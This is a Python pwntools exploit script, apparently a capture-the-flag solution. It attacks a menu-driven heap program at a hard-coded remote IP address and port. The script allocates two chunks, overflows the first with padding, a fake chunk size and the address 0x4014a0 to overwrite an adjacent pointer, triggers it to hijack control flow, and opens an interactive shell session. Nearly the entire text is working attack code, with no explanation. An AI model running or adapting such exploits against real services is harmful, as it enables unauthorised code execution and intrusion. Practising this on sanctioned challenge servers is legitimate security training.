import os
from pwn import *

ezAddr = 0x4014a0

def fun_add(r):
    r.recvuntil('size: ')
    r.sendline('10')
    r.recvuntil('content: ')
    r.sendline('AAAA')


def fun_edit(r):
    r.recvuntil('Index: ')
    r.sendline('0')
    p = b'A' * 24
    p += p64(0x21)
    p += p64(ezAddr)
    r.sendline(p)

os.system('cls')

sh = remote('103.185.38.238', 15733)

sh.recvuntil('Choice: ')
sh.sendline('1')
fun_add(sh)
sh.recvuntil('Choice: ')
sh.sendline('1')
fun_add(sh)
sh.recvuntil('Choice: ')
sh.sendline('2')
fun_edit(sh)
sh.recvuntil('Choice: ')
sh.sendline('3')
sh.recvuntil('Index: ')
sh.sendline('1')

sh.interactive()
